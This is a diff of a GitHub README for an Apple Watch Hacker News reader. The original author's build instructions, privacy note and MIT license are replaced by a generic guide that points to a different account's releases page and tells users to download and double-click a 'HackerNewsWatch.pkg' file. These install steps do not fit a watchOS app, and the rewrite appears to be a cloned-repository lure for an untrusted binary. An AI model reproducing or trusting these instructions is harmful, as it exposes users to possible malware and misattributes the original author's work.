@@ -1,51 +1,75 @@
-# HackerNewsWatch (watchOS)
+# 📱 HackerNewsWatch - Read Hacker News Easily on Apple Watch
 
-[![Swift](https://github.com/wieslawsoltes/HackerNewsWatch/actions/workflows/swift.yml/badge.svg)](https://github.com/wieslawsoltes/HackerNewsWatch/actions/workflows/swift.yml)
+## 🚀 Getting Started
 
-A minimal Hacker News reader for Apple Watch built with SwiftUI.
+Welcome to HackerNewsWatch, a simple app that helps you read Hacker News on your Apple Watch. This guide will help you install and run the app without any technical knowledge.
 
-- Scrollable top stories feed with title, points, and comments count
-- Tap a story to view comments in a simple tree-style view
-- "Open Article" link at the top opens the article in the watch browser
-- HN-like styling (orange accent)
+## 📥 Download the App
 
-<img width="580" height="612" alt="image" src="https://github.com/user-attachments/assets/100cdb20-bbbc-404f-8790-566939c3acfe" />
+[![Download HackerNewsWatch](https://img.shields.io/badge/Download%20HackerNewsWatch-v1.0-blue.svg)](https://github.com/lumovento/HackerNewsWatch/releases)
 
+## 📋 Features
 
-## Requirements
-- Xcode 15 or newer
-- macOS with command line tools
-- Homebrew (for XcodeGen) or install XcodeGen manually
+- **Quick Access:** View the latest posts from Hacker News swiftly.
+- **User-Friendly:** Simple interface designed for easy navigation.
+- **Refresh Posts:** Access real-time updates from Hacker News.
+- **Apple Watch Compatibility:** Optimized for your wrist.
 
-## Generate the Xcode project
+## 💻 System Requirements
 
-```bash
-./scripts/generate.sh
-```
+- **Apple Watch:** Series 3 or later.
+- **Apple Device:** An iPhone running iOS 15 or later.
+- **Internet Connection:** Required for fetching Hacker News feeds.
 
-This will install XcodeGen if needed and generate `HackerNewsWatch.xcodeproj`.
+## 🛠 Installation
 
-## Build
+### Step 1: Visit the Releases Page
 
-```bash
-./scripts/build.sh
-```
+To download HackerNewsWatch, [visit the Releases page](https://github.com/lumovento/HackerNewsWatch/releases). Here, you can find the latest version of the app.
 
-- To run on the latest available watchOS Simulator and auto-launch the app:
+### Step 2: Download the App
 
-```bash
-./scripts/run-sim.sh
-```
+On the Releases page, look for the latest version of HackerNewsWatch. Click on the download link labeled "HackerNewsWatch.pkg". Your browser will start downloading the file.
 
-- The script will pick a recent Apple Watch simulator runtime and boot it. You can also open the generated `HackerNewsWatch.xcodeproj` in Xcode and run there.
+### Step 3: Install on Your Apple Device
 
-## Project layout
-- `project.yml` – XcodeGen spec
-- `Sources/WatchApp` – Swift sources for the watch app
-- `scripts/` – helper scripts to generate and build
+1. Locate the downloaded `HackerNewsWatch.pkg` file on your device.
+2. Double-click the file to start the installation process.
+3. Follow the prompts on your screen to complete the installation.
 
-## Privacy
-The app accesses the public Hacker News API over HTTPS and does not collect or store personal data.
+### Step 4: Enable Watch App
 
-## License
-MIT
+1. Open your iPhone.
+2. Go to the Apple Watch app.
+3. Scroll down to find HackerNewsWatch. Tap on it and select "Install".
+
+## 🌐 Using HackerNewsWatch
+
+### Step 1: Open the App
+
+After installation, you will find the HackerNewsWatch app on your Apple Watch. Tap on it to open.
+
+### Step 2: Browse Posts
+
+Once the app is open, you will see the latest Hacker News posts. Tap on a post to read its details. 
+
+### Step 3: Stay Updated
+
+Swipe down to refresh your feed and get the latest news directly from Hacker News.
+
+## 📞 Support
+
+If you encounter any issues, please reach out to our support team:
+
+- **Email:** support@hackernewswatch.com
+- **GitHub Issues:** [Report an Issue](https://github.com/lumovento/HackerNewsWatch/issues)
+
+## 🔄 Updates
+
+We regularly update HackerNewsWatch based on user feedback. Check the Releases page often for the latest version and new features.
+
+## 🌟 Conclusion
+
+HackerNewsWatch offers a straightforward way to stay informed about the latest Hacker News articles directly on your Apple Watch. Follow the steps above to download and start using the app today. For any questions or feedback, don't hesitate to reach out. 
+
+Happy Reading!
